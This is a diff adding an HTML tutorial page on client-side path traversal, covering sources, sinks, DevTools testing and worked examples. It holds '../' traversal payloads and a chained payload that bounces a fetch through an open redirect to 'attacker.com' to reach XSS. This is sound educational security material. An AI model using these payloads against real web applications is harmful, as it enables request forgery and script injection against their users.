@@ -1,10 +1,235 @@
 <!DOCTYPE html>
-<html>
-<head><title>Article 1</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>redcolour — Understanding Client-Side Path Traversal (CSPT)</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      background: #0A0A0A;
+      color: #222;
+    }
+    .container {
+      max-width: 800px;
+      margin: 50px auto;
+      padding: 0 20px;
+      color: #faf7f7;
+      text-align: left;
+    }
+    .container h1,
+    .container h2 {
+      text-align: center;
+      color: #faf7f7;
+    }
+    h2 {
+      margin-top: 40px;
+    }
+    code {
+      background: #333;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+    pre {
+      background: #333;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      line-height: 1.4;
+    }
+    pre code {
+      background: transparent;
+      padding: 0;
+    }
+    ul, ol {
+      padding-left: 20px;
+    }
+    li {
+      margin-bottom: 8px;
+    }
+    a {
+      color: #4da6ff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    img {
+      max-width: 100%;
+      display: block;
+      margin: 20px auto;
+      border-radius: 8px;
+    }
+  </style>
+</head>
 <body>
-  <h1>Article 1 Title</h1>
-  <p>Full content of article 1...</p>
-  <a href="/">← Back to home</a>
+  <div class="container">
+    <h1>Understanding Client-Side Path Traversal (CSPT)</h1>
+    
+    <p>Every security researcher should be familiar with path traversal vulnerabilities. These allow an attacker to use payloads like <code>../../../../</code> to access data outside the intended directory. Unlike server-side path traversal, which targets files on the server, client-side path traversal (CSPT) exploits weaknesses in frontend code to make unauthorized requests to unintended API endpoints. While server-side path traversal is well-known and commonly exploited, client-side variants have received far less attention and remain relatively rare in public disclosures.</p>
+
+    <h2>Example</h2>
+    <pre><code>const url = `/app/playbooks/${userInput}`;
+fetch(url);</code></pre>
+
+    <p>If <code>userInput = "../../../../api/v4/users"</code> then:</p>
+    <pre><code>fetch("/app/playbooks/../../../../api/v4/users")</code></pre>
+
+    <p>The browser normalizes this path, so now it resolves to:</p>
+    <pre><code>fetch("api/v4/users")</code></pre>
+
+    <p>Nowadays, it is common to have a web application architecture with a back-end API and a dynamic front end such as React or Angular. If the frontend builds API request paths using unvalidated user input (like route parameters <code>[/users/:id → /users/42]</code> or query strings <code>[/users?id=42]</code>), then an attacker can use relative path traversal <code>(../)</code> to forge requests to sensitive or privileged API endpoints even bypassing client-side authorization logic.</p>
+
+    <h2>Visual Representation</h2>
+    <!-- Add your visual representation image here -->
+    <img src="img/visual_representation.png" alt="CSPT Attack Flow">
+    <p>In this context, an attacker with control over the <code>{USER_INPUT}</code> value can perform a path traversal in order to route the victim's request to another endpoint.</p>
+
+    <p>An attacker can coerce a victim into executing this unexpected request. This is the starting point of a Client-Side Path Traversal (CSPT). A Client-Side Path Traversal can be split into two parts.</p>
+    <p>The source is the trigger of the CSPT, while the sinks are the exploitable endpoints that can be reached by this CSPT.</p>
+    <p>In order to understand how we can use CSPT as an attack vector, both source and sink must be defined.</p>
+
+    <h2>Source</h2>
+    <p>The source is where the attacker puts their input, then that input gets used in JavaScript to build a URL. Once one of these sources flows into JavaScript and gets used to dynamically construct a request path, that's where CSPT can be chained into CSRF, XSS, or other attacks.</p>
+    
+    <p>Sources can come from:</p>
+    <ul>
+      <li><strong>URL components:</strong>
+        <ul>
+          <li>A URL query string: <code>?id=...</code></li>
+          <li>The page URL hash: <code>#id=...</code></li>
+          <li>A path parameter: <code>/MyItems/cheese</code></li>
+        </ul>
+      </li>
+      <li><strong>Web APIs and browser-exposed properties:</strong>
+        <ul>
+          <li><code>window.location</code> (all parts)</li>
+          <li><code>window.name</code></li>
+          <li><code>document.referrer</code></li>
+          <li><code>postMessage</code> parameters</li>
+        </ul>
+      </li>
+      <li><strong>Web Storage:</strong>
+        <ul>
+          <li><code>localStorage</code> / <code>sessionStorage</code></li>
+        </ul>
+      </li>
+      <li><strong>HTML Attributes:</strong>
+        <ul>
+          <li><code>form.action</code> / <code>img.src</code> / <code>iframe.src</code> / <code>script.src</code> (if attacker controls the DOM or markup)</li>
+        </ul>
+      </li>
+    </ul>
+
+    <p>In most cases, the input from the source gets inserted into a JavaScript function like <code>fetch()</code>, which sends an HTTP request. This request is triggered by user interaction (like clicking a button) OR happens automatically when the page loads. Depends on the application.</p>
+
+    <h2>Sink</h2>
+    <p>The sink is the JavaScript code that actually makes the request. For example:</p>
+    <ul>
+      <li><code>fetch()</code></li>
+      <li><code>XMLHttpRequest</code></li>
+      <li><code>$.ajax(...)</code></li>
+      <li><code>axios(...)</code></li>
+    </ul>
+    <p>and even HTML elements that can also send requests such as:</p>
+    <ul>
+      <li><code>Image.src</code></li>
+      <li>HTML form <code>action</code> attribute</li>
+      <li><code>iframe.src</code></li>
+      <li><code>script.src</code></li>
+    </ul>
+    <p>These all can act as sinks if they use untrusted (attacker-controlled) data when constructing the URL or path.</p>
+
+    <p>In CSPT, the attacker can only control the path of this request (e.g. <code>/api/v1/users</code>)</p>
+    <p>But the attacker cannot usually change:</p>
+    <ul>
+      <li>The domain (host)</li>
+      <li>The HTTP method (GET/POST/etc.)</li>
+      <li>The request headers</li>
+      <li>The request body (unless there are other inputs involved)</li>
+    </ul>
+
+    <h2>EXAMPLE 1</h2>
+    <p>Let's say there's a JavaScript function like this:</p>
+    <pre><code>const file = getQueryParam("file");
+fetch(`/files/${file}`);</code></pre>
+    <p>If an attacker sends a victim to:</p>
+    <pre><code>https://example.com/page?file=../../../admin/data</code></pre>
+    <p>Then the browser sends a request to:</p>
+    <pre><code>/admin/data</code></pre>
+    <p>The frontend will send a request to an unintended endpoint!</p>
+
+    <h3>Dealing with Request Bodies</h3>
+    <p>Imagine that the frontend (source) sends this JSON data when making a request:</p>
+    <pre><code>{
+  "user_id": "&lt;VICTIM_USER_ID&gt;",
+  "org_id": "&lt;VICTIM_ORG_ID&gt;",
+  "data": ""
+}</code></pre>
+    <p>In this case, only the endpoints that accept this type of body will be reachable sinks. Meaning the attacker's forged request will only be accepted by endpoints that expect this structure.</p>
+    <p>That limits our reachable sinks. However, it is bypassable with a few tricks:</p>
+    <ol>
+      <li><strong>Loose JSON Schemas:</strong> Some APIs don't strictly validate request bodies. So even if the attacker can't modify required parameters like <code>user_id</code>, they can still send extra parameters. The backend may just ignore them and still process the request.</li>
+      <li><strong>Query Parameter Injection:</strong> Since the attacker controls the path, they can usually add query parameters like: <code>/api/v1/users?role=admin</code></li>
+    </ol>
+    <p>In some cases, query parameters may override values in the body depending on how the backend is coded. This opens additional attack possibilities.</p>
+
+    <h2>EXAMPLE 2</h2>
+    <p>To help explain this vulnerability type, let's walk through an example. Say you have a blog website, and you want to make a page (say <code>https://example.com/viewpost</code>) where users could view posts. One way to implement this would be to include the following JS code in the page:</p>
+    <pre><code>// get the value of the URL parameter "p"
+const post_name = new URLSearchParams(location.search).get("p");
+const blog_post_response = await fetch("/api/posts/get_content/" + post_name);
+const post_content = await blog_post_response.text();
+display_post_html(post_content);</code></pre>
+    <p>When a user navigates to <code>https://example.com/viewpost?p=543</code>, the JS code will get the HTML content of post number 543 by sending a request to <code>https://example.com/api/posts/get_content/543</code>, and will then display this content to the user. Because the <code>p</code> parameter can include attacker-controlled input, and its value is used directly in the path component of the URL which the page requests, this code is vulnerable to CSPT. If an attacker sent a victim a link to <code>https://example.com/viewpost?p=../../../asdf</code>, and the victim clicked on it, then the URL which gets constructed in the page would be <code>https://example.com/api/posts/get_content/../../../asdf</code> and as a result the page would send a request to <code>https://example.com/asdf</code>.</p>
+    <p>The rest of the JS code in the page would run normally, and would use the response to this request as if it was the content of a blog post, because it would be stored in the <code>blog_post_response</code> variable.</p>
+    <p>As you can see, the attacker can make the page send the request to an arbitrary endpoint in <code>https://example.com/</code>. To demonstrate the potential impact of this, let's assume that the application has an open redirect gadget in <code>https://example.com/redirect?u=....</code> In that case, an attacker can chain the CSPT vulnerability with the open redirect gadget by using a payload such as <code>../../../?u=https://attacker.com</code>.</p>
+    <p>When this payload is used, the vulnerable page sends the fetch request to <code>https://example.com/redirect?u=https://attacker.com</code>, and the response to this request would be a redirect to <code>https://attacker.com</code>. Because fetch automatically follows redirects by default, a subsequent request would be sent to <code>https://attacker.com</code>, and the response to that request would be stored in the <code>blog_post_response</code> variable. Because the attacker controls this response, the attacker can control the HTML content of the blog post which would be displayed to the user, most likely leading to XSS.</p>
+    
+    <h3>Recap</h3>
+    <ul>
+      <li>A post-serving page calls the fetch function, sending a request to a URL with attacker-controlled input which is not properly encoded in its path, allowing the attacker to inject <code>../</code> sequences to the path and make the request get sent to an arbitrary endpoint. This behavior is referred to as a CSPT vulnerability</li>
+      <li>The attacker makes the request get sent to an endpoint which contains an open redirect vulnerability.</li>
+      <li>The endpoint responds with a redirect to an attacker-controlled domain.</li>
+      <li>This fetch function automatically follows this redirect, sending a request to the attacker-controlled domain.</li>
+      <li>The attacker-controlled domain responds with some malicious response.</li>
+      <li>The fetch function finishes and returns the malicious response.</li>
+      <li>The page treats that response as if it was the content of a blog post, leading to XSS.</li>
+    </ul>
+
+    <h2>Testing for CSPT</h2>
+    <p>You can test for these issues in two ways:</p>
+    <ol>
+      <li><strong>Manually reviewing JavaScript code:</strong> Use DevTools to find any <code>fetch()</code>/XHR calls via breakpoints to let the browser pause the moment any XHR/fetch is about to fire. At that breakpoint, you can inspect the call stack and see exactly which JS file and line concatenated your "?param=...".</li>
+      <li><strong>Observing requests in browser:</strong> Watch XHR or fetch requests in the Network tab of DevTools (make sure "All" requests are shown). Check if any request paths are influenced by user-controlled inputs.</li>
+    </ol>
+    
+    <h3>Important Notes</h3>
+    <ul>
+      <li>Requests can be triggered automatically on page load or through user actions</li>
+      <li>Look for places where user-controlled inputs are inserted into paths</li>
+      <li>Network tab only shows obvious parameters - hidden/internal ones require code analysis</li>
+    </ul>
+
+    <h2>Tools & Automation</h2>
+    <ul>
+      <li><a href="https://addons.mozilla.org/en-US/firefox/addon/eval-villain/">Eval Villain</a> for semi-automated testing</li>
+      <li>Research like <a href="https://www.usenix.org/system/files/sec21-khodayari.pdf">JAW: Studying Client-side CSRF</a> for automation approaches</li>
+      <li>Manual analysis remains essential for complex applications</li>
+    </ul>
+
+    <h2>Write-ups & Resources</h2>
+    <ul>
+      <li><a href="https://blog.doyensec.com/2025/03/27/cspt-resources.htm">CSPT Fundamentals (Doyensec)</a></li>
+      <li><a href="https://medium.com/@Nightbloodz/the-power-of-client-side-path-traversal">Real-world CSPT Case Study</a></li>
+      <li><a href="https://book.hacktricks.xyz/en/pentesting-web/client-side-path-traversal">HackTricks CSPT Guide</a></li>
+      <li><a href="https://github.com/doyensec/CSPTPlayground">CSPT Playground (Practice)</a></li>
+    </ul>
+
+    <h2>Disclaimer</h2>
+    <p>This started as personal notes from my web hacking learning journey. I've cleaned them up in case they help others too. If you're learning too and want to connect:</p>
+    <p>Discord: symibot<br>Twitter/X: symibot</p>
+  </div>
 </body>
 </html>
-
